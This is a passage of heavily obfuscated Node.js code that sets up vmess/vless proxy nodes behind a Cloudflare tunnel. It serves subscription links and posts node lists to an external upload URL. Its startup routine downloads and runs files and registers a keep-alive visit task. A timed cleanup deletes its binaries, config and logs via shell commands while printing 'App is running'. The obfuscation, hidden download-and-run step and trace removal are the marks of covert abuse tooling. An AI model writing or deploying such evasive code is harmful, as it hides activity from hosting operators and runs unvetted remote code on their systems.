_0x398756={_0x16fdf3:0x1d8,_0x3c09b9:0x1b7,_0x471c80:0x209,_0x2eb617:0x19d,_0x32b9a9:0x1a1,_0x3efa20:0x20d,_0xa43f7c:0x18d,_0x224354:0x1ae},_0x4a9d82=await _0x5bfa11(),_0x5d1cf9=NAME?NAME+'-'+_0x4a9d82:_0x4a9d82;return new Promise(_0x4f529c=>{const _0x4f5188={_0x27e0c0:0x1df,_0x703332:0x1c5};setTimeout(()=>{const _0x527861=_0x4ebc,_0x3599d0={'v':'2','ps':''+_0x5d1cf9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x527861(0x191),'net':'ws','type':_0x527861(0x191),'host':_0x26cc88,'path':_0x527861(0x1b8),'tls':_0x527861(0x214),'sni':_0x26cc88,'alpn':'','fp':_0x527861(_0x398756._0x16fdf3)},_0x373e66=_0x527861(0x221)+UUID+'@'+CFIP+':'+CFPORT+_0x527861(_0x398756._0x3c09b9)+_0x26cc88+'&fp=firefox&type=ws&host='+_0x26cc88+_0x527861(_0x398756._0x471c80)+_0x5d1cf9+_0x527861(0x178)+Buffer[_0x527861(0x1e9)](JSON[_0x527861(_0x398756._0x2eb617)](_0x3599d0))[_0x527861(_0x398756._0x32b9a9)](_0x527861(_0x398756._0x3efa20))+_0x527861(0x186)+UUID+'@'+CFIP+':'+CFPORT+_0x527861(_0x398756._0xa43f7c)+_0x26cc88+_0x527861(0x19b)+_0x26cc88+_0x527861(0x1b9)+_0x5d1cf9+_0x527861(0x199);console[_0x527861(_0x398756._0x224354)](Buffer[_0x527861(0x1e9)](_0x373e66)[_0x527861(_0x398756._0x32b9a9)](_0x527861(0x20d))),fs[_0x527861(0x1fe)](subPath,Buffer['from'](_0x373e66)['toString']('base64')),console[_0x527861(_0x398756._0x224354)](FILE_PATH+_0x527861(0x1a3)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x426e5a,_0x227828)=>{const _0x2e3ee0=_0x527861,_0x20b0c7=Buffer['from'](_0x373e66)[_0x2e3ee0(0x1a1)]('base64');_0x227828[_0x2e3ee0(_0x4f5188._0x27e0c0)](_0x2e3ee0(0x1f9),_0x2e3ee0(_0x4f5188._0x703332)),_0x227828[_0x2e3ee0(0x1bb)](_0x20b0c7);}),_0x4f529c(_0x373e66);},0x7d0);});}}async function uploadNodes(){const _0x523d35={_0x5bfb6f:0x1f4,_0x18dab0:0x1ca,_0x596801:0x1eb,_0x4d9fc2:0x212,_0x153ae3:0x1fc,_0x3f48df:0x180,_0x5d2dc6:0x1eb},_0x5183b9=_0x2acae4;if(UPLOAD_URL&&PROJECT_URL){const _0x2e271c=PROJECT_URL+'/'+SUB_PATH,_0x3b1800={'subscription':[_0x2e271c]};try{const _0x34f9cc=await axios[_0x5183b9(0x1c2)](UPLOAD_URL+'/api/add-subscriptions',_0x3b1800,{'headers':{'Content-Type':'application/json'}});return _0x34f9cc&&_0x34f9cc[_0x5183b9(0x1eb)]===0xc8?(console[_0x5183b9(0x1ae)](_0x5183b9(_0x523d35._0x5bfb6f)),_0x34f9cc):null;}catch(_0x43c0d7){if(_0x43c0d7['response']){if(_0x43c0d7[_0x5183b9(_0x523d35._0x18dab0)][_0x5183b9(_0x523d35._0x596801)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2bf8bc=fs[_0x5183b9(_0x523d35._0x4d9fc2)](listPath,_0x5183b9(0x1ce)),_0x4e7724=_0x2bf8bc[_0x5183b9(_0x523d35._0x153ae3)]('\x0a')['filter'](_0xa50e70=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xa50e70));if(_0x4e7724[_0x5183b9(_0x523d35._0x3f48df)]===0x0)return;const _0x55b114=JSON['stringify']({'nodes':_0x4e7724});try{const _0x151490=await axios[_0x5183b9(0x1c2)](UPLOAD_URL+_0x5183b9(0x1ab),_0x55b114,{'headers':{'Content-Type':_0x5183b9(0x1ac)}});return _0x151490&&_0x151490[_0x5183b9(_0x523d35._0x5d2dc6)]===0xc8?(console[_0x5183b9(0x1ae)]('Nodes\x20uploaded\x20successfully'),_0x151490):null;}catch(_0x5a096d){return null;}}else return;}}function _0x4ebc(_0x27e095,_0x1353a2){const _0x390e1e=_0x390e();return _0x4ebc=function(_0x4ebc35,_0x4014dc){_0x4ebc35=_0x4ebc35-0x170;let _0x5049b0=_0x390e1e[_0x4ebc35];return _0x5049b0;},_0x4ebc(_0x27e095,_0x1353a2);}function cleanFiles(){const _0x12856d={_0x5c35ee:0x1e7,_0x1210f8:0x231,_0x57240d:0x17c,_0x46a7b6:0x1c6,_0xebc953:0x1d3},_0x38d4e8={_0x36205b:0x1b6,_0x21055f:0x1ae};setTimeout(()=>{const _0x1dcb9={_0x2387eb:0x1b6,_0x432daf:0x1ae,_0x58be67:0x1ae},_0x509cf4=_0x4ebc,_0x39f306=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x39f306[_0x509cf4(0x1e7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x39f306[_0x509cf4(_0x12856d._0x5c35ee)](phpPath);process[_0x509cf4(0x1e3)]===_0x509cf4(_0x12856d._0x1210f8)?exec(_0x509cf4(_0x12856d._0x57240d)+_0x39f306['join']('\x20')+_0x509cf4(_0x12856d._0x46a7b6),_0x19b102=>{const _0xa65077=_0x509cf4;console[_0xa65077(_0x38d4e8._0x36205b)](),console[_0xa65077(_0x38d4e8._0x21055f)](_0xa65077(0x172)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x509cf4(0x20f)+_0x39f306['join']('\x20')+_0x509cf4(_0x12856d._0xebc953),_0x599834=>{const _0x81eb5a=_0x509cf4;console[_0x81eb5a(_0x1dcb9._0x2387eb)](),console[_0x81eb5a(_0x1dcb9._0x432daf)]('App\x20is\x20running'),console[_0x81eb5a(_0x1dcb9._0x58be67)](_0x81eb5a(0x236));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x52ed4c={_0x274451:0x1ae,_0xbad045:0x1c0,_0x34f719:0x1c2,_0x233dbf:0x1b5,_0x4c7dba:0x1ae,_0xf3f14a:0x1a5,_0x46e949:0x173,_0x22d64d:0x1af},_0x2daa52=_0x2acae4;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2daa52(_0x52ed4c._0x274451)](_0x2daa52(_0x52ed4c._0xbad045));return;}try{const _0x38d7cb=await axios[_0x2daa52(_0x52ed4c._0x34f719)](_0x2daa52(_0x52ed4c._0x233dbf),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2daa52(0x1ac)}});return console[_0x2daa52(_0x52ed4c._0x4c7dba)](_0x2daa52(_0x52ed4c._0xf3f14a)),_0x38d7cb;}catch(_0x3e6018){return console[_0x2daa52(_0x52ed4c._0x46e949)](_0x2daa52(_0x52ed4c._0x22d64d)+_0x3e6018[_0x2daa52(0x205)]),null;}}async function startserver(){const _0x4538d7={_0x2c357a:0x173},_0x52fcac=_0x2acae4;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3619fa){console[_0x52fcac(_0x4538d7._0x2c357a)]('Error\x20in\x20startserver:',_0x3619fa);}}startserver()[_0x2acae4(0x203)](_0xe307f5=>{const _0x4425d2={_0x5cfdde:0x173,_0x7a628e:0x1c8},_0x3ca82a=_0x2acae4;console[_0x3ca82a(_0x4425d2._0x5cfdde)](_0x3ca82a(_0x4425d2._0x7a628e),_0xe307f5);}),app[_0x2acae4(0x227)](PORT,()=>console[_0x2acae4(0x1ae)](_0x2acae4(0x1f5)+PORT+'!'));
